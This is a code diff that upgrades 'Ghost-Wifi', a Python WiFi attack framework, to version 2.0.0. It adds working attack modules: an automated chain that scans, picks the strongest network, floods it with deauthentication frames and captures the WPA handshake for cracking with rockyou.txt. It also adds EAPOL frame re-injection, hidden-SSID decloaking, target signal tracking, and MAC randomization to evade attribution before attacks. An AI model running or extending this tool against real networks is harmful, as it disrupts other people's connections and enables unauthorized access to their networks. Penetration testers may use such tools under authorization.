@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-  GHOST-WIFI  v1.0.0  |  WiFi Attack & Audit Framework
-  By Gh0st-Bx1        |  github.com/Ghost-Bx1
+Ghost-Wifi v2.0.0 - WiFi Attack & Audit Framework
+By Gh0st-Bx1 | github.com/Ghost-Bx1
 """
 
 import argparse
@@ -20,20 +20,74 @@ import time
 from datetime import datetime
 from pathlib import Path
 
-# ─── Colors ───────────────────────────────────────────────────────────────────
 try:
     import colorama
     colorama.init(autoreset=True)
-    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
-    B = "\033[94m"; M = "\033[95m"; C = "\033[96m"
-    W = "\033[97m"; DIM = "\033[2m"; RST = "\033[0m"
 except ImportError:
-    R = G = Y = B = M = C = W = DIM = RST = ""
+    pass
 
-BANNER = f"""
-{R}  GHOST-WIFI  v1.0.0  |  WiFi Attack & Audit Framework{RST}
-{DIM}  By Gh0st-Bx1        |  github.com/Ghost-Bx1{RST}
-"""
+R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
+B = "\033[94m"; M = "\033[95m"; C = "\033[96m"
+W = "\033[97m"; DIM = "\033[2m"; RST = "\033[0m"
+
+VERSAO = "2.0.0"
+
+
+def _build_banner():
+    import re as _re
+    Gc = "\033[92m"; Cy = "\033[96m"; D = "\033[2m"; N = "\033[1m"
+    Wc = "\033[97m"; X = "\033[0m"
+    IW = 68; eq = "═" * IW; sp = " " * IW
+    TL = "╔"; TR = "╗"; BL = "╚"; BR = "╝"; VB = "║"
+    hl = "─" * 44; bar = "│"
+    vl = lambda s: len(_re.sub(r"\x1b\[[0-9;]*m", "", s))
+
+    def _row(s):
+        n = vl(s); p = max(0, IW - n); l = p // 2; r = p - l
+        return f"{Gc}{VB}{X}{' ' * l}{s}{' ' * r}{Gc}{VB}{X}"
+
+    def _row_l(s):
+        n = vl(s); p = max(0, IW - n - 2)
+        return f"{Gc}{VB}{X}  {s}{' ' * p}{Gc}{VB}{X}"
+
+    ga = [
+        ("", f"{Gc}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠛⠛⠟⠟⠉⠛⣻⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
+        ("", f"{Gc}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⣀⣡⣤⣶⣶⣶⣶⣶⣶⣤⣀⡢⡝⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
+        ("", f"{Gc}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡡⣀⣴⡿⡛⡴⡿⣿⣿⣿⣿⣿⣿⣿⡿⣶⡑⠈⡛⠟⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
+        ("", f"{Gc}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⡜⣀⣾⣿⣤⣋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⣻⣶⣦⣤⣀⠉⠛⣿⣿⣿⡿⠟⡛⡛⣻⠟⣿⣿⣿⣿{X}", ""),
+        ("", f"{Gc}⣿⠟⠟⠟⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⣀⣿⣿⣿⡿⠛⠛⣻⣿⣿⣿⡿⠛⠛⡿⣿⣿⣧⠉⠉⣁⣈⣉⣁⣀⣿⣿⡛⠄⣁⣴⣶⣄⠐⣌⣻⣿{X}", ""),
+        ("", f"{Gc}⡏⠀⣴⣶⣄⡢⡙⡿⣿⣿⣿⣿⣿⣿⡇⠀⣼⣿⣿⣿⡅⠀⠀  ⡺⣿⡿⠁⠀⠀⠀⡺⣿⣿⡆⠀⣿⣿⣿⣿⣿⡏⠁⣀⣴⣿⣿⣿⣿⣷⡈⠎⡿{X}", ""),
+        ("", f"{Gc}⡇⠀⣿⣿⣿⣷⣌⠀⠙⡿⣿⣿⣿⣿⠀⣀⣿⣿⣿⣿⠀⠀⠀  ⠀⠈⣿⡇⠀⠀⠀⠀⠈⡿⣿⡇⠁⣻⣿⣿⣿⡿⠁⣀⣾⣿⣿⣿⡿⡿⣿⣷⠀⠘⣿{X}", ""),
+        ("", f"{Gc}⣇⠀⡿⣿⣿⡏⣿⣷⣄⠀⠙⡿⣿⡇⠀⣸⣿⣿⡿⣿⡀⠀⠀⠀  ⣸⣿⣧⠀⠀⠀⠀⣸⡈⣿⣷⠀⡈⣿⣿⡿⠁⣀⣾⣿⣿⣊⣿⠁⣾⣿⣿⡆⠀⡿{X}", ""),
+        ("", f"{Gc}⣿⡀⠘⣿⣿⣿⡘⣿⣿⣷⣌⠂⠉⠁⣀⣿⣿⡏⣰⡿⣷⣤⣤⣴⣿⣿⣿⣷⣄⣀⣴⣿⣧⠘⣿⣧⣐⡢⠉⠁⣀⣾⣿⣿⡇⣼⣿⣸⣿⣿⣿⣇⠀⣸{X}", ""),
+        ("", f"{Gc}⣿⣷⡀⠘⣿⣿⣧⠘⣿⣿⣿⣿⣶⣶⣿⣿⠏⡰⡛⣾⣿⣿⣿⣿⡏⠀⠈⣿⣿⣿⣿⣿⣏⡳⡘⣿⣿⣷⣶⣾⣿⣿⣿⣿⣀⣿⣿⣿⣿⣿⣿⣿⠀⣸{X}", ""),
+        ("", f"{Gc}⣿⣿⡇⠀⣿⣿⣿⡄⡿⡿⣿⣿⣿⣿⣿⣷⣾⣷⣿⣿⣿⣿⣿⣿⣧⣀⣀⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠛⠋⠉⠉⠛⠟⠟⣿⠀⣸{X}", ""),
+        ("", f"{Gc}⣿⣿⡇⣀⣿⣿⣿⣧⣸⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⣀⣾⣿⡄⠈⠀⠀⠀⠀ ⣾{X}", ""),
+        ("", f"{Gc}⣿⡏⠀⣸⣿⣿⣿⣿⡜⡇⡿⣧⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡉⠛⠟⠀⡰⠀⠀ ⣀⣾{X}", ""),
+    ]
+
+    info = [
+        f"{Gc}{N}GHOST-WIFI{X}",
+        f"{Cy}v{VERSAO}  {D}WiFi Attack & Audit Framework{X}",
+        f"{D}{hl}{X}",
+        f"{Wc}By Gh0st-Bx1  {D}{bar}  github.com/Ghost-Bx1{X}",
+        f"{D}{hl}{X}",
+        f"{D}--interface --scan --deauth --handshake{X}",
+        f"{D}--pmkid --wps --evil-twin --auto --mac-rand{X}",
+    ]
+
+    out = [f"{Gc}{TL}{eq}{TR}{X}", f"{Gc}{VB}{sp}{VB}{X}"]
+    for left, center, right in ga:
+        combined = left + center + right
+        out.append(_row(combined))
+    out.append(f"{Gc}{VB}{sp}{VB}{X}")
+    for i in info:
+        out.append(_row_l(i))
+    out += [f"{Gc}{VB}{sp}{VB}{X}", f"{Gc}{BL}{eq}{BR}{X}"]
+    return "\n".join(out)
+
+
+BANNER = _build_banner()
 
 # ─── Helpers ──────────────────────────────────────────────────────────────────
 
@@ -240,9 +294,17 @@ def _print_scan_results(aps, clients, verbose=False):
     print("-" * 70)
     for ap in sorted(aps, key=lambda x: int(x["power"]) if x["power"].lstrip("-").isdigit() else 0):
         enc = ap["privacy"]
-        color = R if "WEP" in enc else (Y if "WPS" in enc else G)
-        hidden = "[hidden]" if not ap["essid"] else ap["essid"]
-        print(f"  {ap['bssid']:<19} {ap['channel']:<4} {ap['power']:<5} {color}{enc:<10}{RST} {hidden}")
+        if "WEP" in enc:
+            color = R
+        elif "SAE" in enc or "WPA3" in enc.upper():
+            color = M  # magenta = WPA3
+        elif "WPS" in enc:
+            color = Y
+        else:
+            color = G
+        enc_tag = enc + (" [WPA3]" if "SAE" in enc else "")
+        hidden = f"{DIM}[hidden]{RST}" if not ap["essid"] else ap["essid"]
+        print(f"  {ap['bssid']:<19} {ap['channel']:<4} {ap['power']:<5} {color}{enc_tag:<14}{RST} {hidden}")
 
     if clients:
         print(f"\n{W}{'CLIENT MAC':<19} {'PWR':<5} {'BSSID':<19} PROBED ESSIDs{RST}")
@@ -281,6 +343,8 @@ def cmd_deauth(args):
     require_root()
     require_tool("aireplay-ng")
     mon = args.interface
+    if getattr(args, "mac_rand", False):
+        mac_randomize(mon)
     bssid = args.bssid
     client = args.client or "FF:FF:FF:FF:FF:FF"
     count = args.count or 0  # 0 = continuous
@@ -314,6 +378,8 @@ def cmd_capture(args):
     require_root()
     require_tool("airodump-ng", "aireplay-ng")
     mon = args.interface
+    if getattr(args, "mac_rand", False):
+        mac_randomize(mon)
     bssid = args.bssid
     essid = args.essid or bssid
     channel = args.channel
@@ -838,6 +904,253 @@ def cmd_info(args):
     print(f"\n{W}Install missing tools:{RST}")
     print("  sudo apt install aircrack-ng reaver bully hcxdumptool hcxtools hashcat hostapd dnsmasq bettercap macchanger")
 
+# ─── MAC randomization helper ────────────────────────────────────────────────
+
+def mac_randomize(interface):
+    import random
+    if shutil.which("macchanger"):
+        out, _, rc = run(f"macchanger -r {interface}")
+        m = re.search(r"New MAC:\s+([\da-f:]+)", out, re.I)
+        if rc == 0 and m:
+            ok(f"MAC randomized -> {m.group(1)}")
+            return m.group(1)
+    # manual fallback
+    mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))
+    run(f"ip link set {interface} down")
+    run(f"ip link set {interface} address {mac}")
+    run(f"ip link set {interface} up")
+    ok(f"MAC set to {mac} (manual)")
+    return mac
+
+
+# ─── Module: auto-attack ──────────────────────────────────────────────────────
+
+def cmd_auto(args):
+    if not args.no_banner:
+        print_banner()
+    require_root()
+    require_tool("airodump-ng", "aireplay-ng")
+    mon = args.interface
+
+    if args.mac_rand:
+        mac_randomize(mon)
+
+    # Step 1: scan
+    info(f"[1/3] Scanning {args.scan_time}s to discover targets...")
+    out_prefix = tempfile.mktemp(prefix="/tmp/ghostauto_")
+    band_opt = f"--band {args.band}" if args.band else ""
+    proc = subprocess.Popen(
+        f"airodump-ng {mon} {band_opt} --write {out_prefix} --output-format csv -a",
+        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    time.sleep(args.scan_time)
+    proc.terminate(); proc.wait()
+
+    csv_file = f"{out_prefix}-01.csv"
+    aps, _ = _parse_airodump_csv(csv_file) if os.path.exists(csv_file) else ([], [])
+
+    if not aps:
+        err("No APs found during scan."); return
+
+    # Filter by encryption
+    targets = [ap for ap in aps if args.target_enc in ap.get("privacy", "")]
+    if not targets:
+        warn(f"No {args.target_enc} networks found. Showing all APs:")
+        targets = aps
+
+    _print_scan_results(targets, [], args.verbose)
+
+    # Step 2: pick target
+    if args.bssid:
+        target = next((a for a in targets if a["bssid"].lower() == args.bssid.lower()), None)
+        if not target:
+            err(f"BSSID {args.bssid} not found in scan."); return
+    else:
+        # pick strongest signal
+        def pwr(ap):
+            try: return int(ap["power"])
+            except: return -99
+        target = sorted(targets, key=pwr, reverse=True)[0]
+
+    ok(f"[2/3] Target: {target['essid']} ({target['bssid']}) CH:{target['channel']} ENC:{target['privacy']}")
+
+    if target.get("privacy", "").upper() in ("WPA3", "SAE"):
+        warn("WPA3/SAE detected - deauth may not force reconnect; using passive capture.")
+        args.passive = True
+
+    channel = int(target["channel"]) if target["channel"].strip().isdigit() else 1
+    run(f"iwconfig {mon} channel {channel}")
+
+    # Step 3: capture
+    info("[3/3] Capturing handshake...")
+    cap_prefix = args.output or f"auto_{target['bssid'].replace(':','')}"
+    cap_proc = subprocess.Popen(
+        f"airodump-ng -c {channel} --bssid {target['bssid']} -w {cap_prefix} {mon}",
+        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+
+    handshake = False
+    for i in range(args.deauth_rounds):
+        if not getattr(args, "passive", False):
+            run(f"aireplay-ng --deauth 5 -a {target['bssid']} {mon}", timeout=10)
+        time.sleep(4)
+        cap_file = f"{cap_prefix}-01.cap"
+        if os.path.exists(cap_file):
+            out2, _, _ = run(f"aircrack-ng {cap_file} 2>&1 | grep -i handshake")
+            if "handshake" in out2.lower():
+                handshake = True
+                break
+
+    cap_proc.terminate(); cap_proc.wait()
+    cap_file = f"{cap_prefix}-01.cap"
+
+    if handshake:
+        ok(f"Handshake captured: {cap_file}")
+        ok(f"Next: ghost-wifi.py crack --cap {cap_file} --wordlist rockyou.txt")
+    else:
+        warn(f"Handshake not confirmed. File: {cap_file}")
+
+    for f in Path("/tmp").glob("ghostauto_*"):
+        try: f.unlink()
+        except: pass
+
+
+# ─── Module: decloak (hidden SSID detection) ──────────────────────────────────
+
+def cmd_decloak(args):
+    if not args.no_banner:
+        print_banner()
+    require_root()
+    require_tool("airodump-ng")
+    mon = args.interface
+    duration = args.duration or 60
+
+    info(f"Listening for probe responses to de-cloak hidden SSIDs ({duration}s)...")
+    info("Probe requests from clients will reveal hidden SSIDs.")
+    out_prefix = tempfile.mktemp(prefix="/tmp/ghostdecloak_")
+    proc = subprocess.Popen(
+        f"airodump-ng {mon} --write {out_prefix} --output-format csv -a",
+        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    time.sleep(duration)
+    proc.terminate(); proc.wait()
+
+    csv_file = f"{out_prefix}-01.csv"
+    if not os.path.exists(csv_file):
+        err("No capture file created."); return
+
+    aps, clients = _parse_airodump_csv(csv_file)
+    hidden = [ap for ap in aps if not ap.get("essid") or ap["essid"] == ""]
+    probed = {}
+    for c in clients:
+        if c.get("probed_essids"):
+            bssid = c["bssid"].strip()
+            for ssid in c["probed_essids"].split(","):
+                ssid = ssid.strip()
+                if ssid and ssid not in ("", " "):
+                    probed.setdefault(bssid, set()).add(ssid)
+
+    print(f"\n{W}Hidden APs detected: {len(hidden)}{RST}")
+    resolved = 0
+    for ap in hidden:
+        bssid = ap["bssid"]
+        ssids = probed.get(bssid, set())
+        if ssids:
+            ok(f"{bssid} CH:{ap['channel']} -> SSID: {', '.join(ssids)}")
+            resolved += 1
+        else:
+            warn(f"{bssid} CH:{ap['channel']} -> SSID: [not yet revealed - no probes seen]")
+
+    info(f"De-cloaked {resolved}/{len(hidden)} hidden networks.")
+    if resolved < len(hidden):
+        info("Tip: Send deauth to hidden AP clients to force probe requests.")
+
+    if args.output:
+        result = [{"bssid": ap["bssid"], "channel": ap["channel"],
+                   "ssids": list(probed.get(ap["bssid"], []))} for ap in hidden]
+        save_json({"hidden_aps": result}, args.output)
+
+    for f in Path("/tmp").glob("ghostdecloak_*"):
+        try: f.unlink()
+        except: pass
+
+
+# ─── Module: eapol re-injection ───────────────────────────────────────────────
+
+def cmd_eapol(args):
+    if not args.no_banner:
+        print_banner()
+    require_root()
+    require_tool("aireplay-ng")
+    mon = args.interface
+    bssid = args.bssid
+    cap_file = args.cap
+
+    if not os.path.exists(cap_file):
+        err(f"Capture file not found: {cap_file}"); return
+
+    if args.channel:
+        run(f"iwconfig {mon} channel {args.channel}")
+        ok(f"Set channel {args.channel}")
+
+    info(f"Re-injecting EAPOL from {cap_file} to {bssid}...")
+    info("This forces clients to re-authenticate, increasing chance of capturing handshake.")
+
+    for i in range(args.count):
+        info(f"Injection round {i+1}/{args.count}")
+        run(f"aireplay-ng --deauth 3 -a {bssid} {mon}", timeout=10)
+        time.sleep(2)
+        # inject from capture file
+        _, _, rc = run(f"aireplay-ng -2 -b {bssid} -r {cap_file} {mon}", timeout=15)
+        if rc == 0:
+            ok(f"Round {i+1}: EAPOL frames injected")
+        time.sleep(args.interval)
+
+    ok("EAPOL re-injection complete.")
+
+
+# ─── Module: signal tracking ──────────────────────────────────────────────────
+
+def cmd_signal(args):
+    if not args.no_banner:
+        print_banner()
+    require_root()
+    require_tool("iw")
+    mon = args.interface
+    bssid = args.bssid
+    duration = args.duration or 30
+    interval = args.interval or 2
+
+    info(f"Tracking signal for {bssid} on {mon} ({duration}s, {interval}s interval)...")
+    readings = []
+    start = time.time()
+    try:
+        while time.time() - start < duration:
+            out, _, _ = run(f"iw dev {mon} scan flush 2>/dev/null | grep -A5 {bssid}")
+            sig = re.search(r"signal:\s*([-\d.]+)", out)
+            if sig:
+                val = float(sig.group(1))
+                ts = datetime.now().strftime("%H:%M:%S")
+                bar_len = max(0, min(40, int((val + 100) * 0.8)))
+                bar = f"{G}{'|' * bar_len}{RST}{'.' * (40 - bar_len)}"
+                print(f"\r  {ts}  {bssid}  [{bar}] {val:.1f} dBm   ", end="", flush=True)
+                readings.append({"time": ts, "signal": val})
+            time.sleep(interval)
+    except KeyboardInterrupt:
+        pass
+    print()
+
+    if readings:
+        avg = sum(r["signal"] for r in readings) / len(readings)
+        mn = min(r["signal"] for r in readings)
+        mx = max(r["signal"] for r in readings)
+        ok(f"Signal stats - Avg: {avg:.1f} dBm  Min: {mn:.1f}  Max: {mx:.1f}  Samples: {len(readings)}")
+        if args.output:
+            save_json({"bssid": bssid, "readings": readings, "avg": avg, "min": mn, "max": mx}, args.output)
+    else:
+        warn(f"No signal readings for {bssid}. Is the AP in range?")
+
+
 # ─── Built-in mini wordlist ───────────────────────────────────────────────────
 
 MINI_WORDLIST = [
@@ -891,6 +1204,7 @@ def build_parser():
     da.add_argument("--client", default="FF:FF:FF:FF:FF:FF", help="Client MAC (default: broadcast)")
     da.add_argument("--channel", type=int)
     da.add_argument("--count", type=int, default=0, help="Deauth frames (0=continuous)")
+    da.add_argument("--mac-rand", action="store_true", help="Randomize MAC before attack")
 
     # capture
     cap = sub.add_parser("capture", help="Capture WPA/WPA2 4-way handshake")
@@ -900,6 +1214,7 @@ def build_parser():
     cap.add_argument("--channel", type=int)
     cap.add_argument("--passive", action="store_true", help="No deauth, passive capture only")
     cap.add_argument("--timeout", type=int, default=120)
+    cap.add_argument("--mac-rand", action="store_true", help="Randomize MAC before capture")
 
     # pmkid
     pm = sub.add_parser("pmkid", help="Clientless PMKID attack")
@@ -958,6 +1273,38 @@ def build_parser():
     # info
     sub.add_parser("info", help="Check tool dependencies")
 
+    # auto (automated attack chain)
+    at = sub.add_parser("auto", help="Automated scan->deauth->capture chain")
+    at.add_argument("-i", "--interface", required=True)
+    at.add_argument("--bssid", help="Target BSSID (auto-select strongest if omitted)")
+    at.add_argument("--scan-time", type=int, default=20, help="Scan duration in seconds")
+    at.add_argument("--deauth-rounds", type=int, default=5, help="Deauth rounds before giving up")
+    at.add_argument("--target-enc", default="WPA", help="Target encryption filter (WPA, WEP, OPN)")
+    at.add_argument("--band", choices=["a", "b", "abg", "abgn"], help="Band to scan")
+    at.add_argument("--mac-rand", action="store_true", help="Randomize MAC address before attack")
+    at.add_argument("--passive", action="store_true", help="No deauth, passive capture only")
+
+    # decloak (hidden SSID)
+    dc = sub.add_parser("decloak", help="Detect hidden SSIDs from probe traffic")
+    dc.add_argument("-i", "--interface", required=True)
+    dc.add_argument("--duration", type=int, default=60, help="Listen duration in seconds")
+
+    # eapol (re-injection)
+    ep = sub.add_parser("eapol", help="EAPOL frame re-injection from capture file")
+    ep.add_argument("-i", "--interface", required=True)
+    ep.add_argument("--bssid", required=True, help="Target AP MAC")
+    ep.add_argument("--cap", required=True, help="Capture file with EAPOL frames")
+    ep.add_argument("--channel", type=int)
+    ep.add_argument("--count", type=int, default=3, help="Re-injection rounds")
+    ep.add_argument("--interval", type=int, default=5, help="Seconds between rounds")
+
+    # signal (tracking)
+    sg = sub.add_parser("signal", help="Track AP signal strength over time")
+    sg.add_argument("-i", "--interface", required=True)
+    sg.add_argument("--bssid", required=True, help="Target AP MAC")
+    sg.add_argument("--duration", type=int, default=30, help="Tracking duration in seconds")
+    sg.add_argument("--interval", type=int, default=2, help="Sampling interval in seconds")
+
     return p
 
 # ─── Entry point ──────────────────────────────────────────────────────────────
@@ -978,6 +1325,10 @@ COMMANDS = {
     "karma":     cmd_karma,
     "handshake": cmd_handshake,
     "info":      cmd_info,
+    "auto":      cmd_auto,
+    "decloak":   cmd_decloak,
+    "eapol":     cmd_eapol,
+    "signal":    cmd_signal,
 }
 
 def main():
